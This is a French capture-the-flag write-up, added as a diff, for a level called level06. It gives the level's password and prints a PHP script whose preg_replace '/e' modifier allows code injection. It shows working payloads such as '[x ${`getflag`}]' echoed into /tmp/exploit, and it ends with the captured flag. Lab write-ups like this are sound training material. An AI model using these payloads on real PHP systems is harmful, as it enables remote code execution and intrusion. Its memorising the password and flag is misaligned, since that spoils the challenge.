@@ -1,0 +1,44 @@
+On se connecte a level06 avec viuaaale9huek52boumoomioc
+
+On peut voir avec ls deux fichiers, level06 qui est un binaire et level06.php, un programme qui prend un arguement et qui va contenir deux fonctions qui font des preg_replace
+Apres analyse, et un peu de recherche on peut voir qu'un des preg_replace utilise le regex modifier 'e' qui permet d'utiliser du code php au sein de l'expression (ici de nous retourner le resultat de getflag)
+(https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier)
+
+Le code indenté: 
+```
+    function y($m)
+    { 
+        $m = preg_replace("/\./", " x ", $m);
+        $m = preg_replace("/@/", " y", $m);
+        return $m;
+    }
+
+    function x($y, $z) 
+    { 
+        $a = file_get_contents($y);
+        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); # La ligne qui nous interesse
+        $a = preg_replace("/\[/", "(", $a);
+        $a = preg_replace("/\]/", ")", $a);
+        return $a;
+    }
+
+    $r = x($argv[1], $argv[2]);
+    print $r;
+```
+
+Il est donc possible d'exploiter cette faille pour lui faire executer getflag et nous la retourner.
+https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/
+
+Le seul truc a faire est de respecter la syntaxe imposé par le regex, ici on peut donc mettre simplement notre expression comme ci:
+
+    [x ${`getflag`}]
+
+En faisant un strings sur le binaire, on peut voir qu'il va utiliser notre fichier php
+Il ne nous reste plus qu'a echo dans un fichier dans /tmp/ notre string pour obtenir notre flag
+
+echo [x ${`getflag`}] > /tmp/exploit
+
+ou  echo "[x {\${system(getflag)}}]" > /tmp/exploit
+
+Le programme va nous afficher une erreur mais aussi le resultat de getflag avec notre flag : wiok45aaoguiboiki2tuin6ub
+
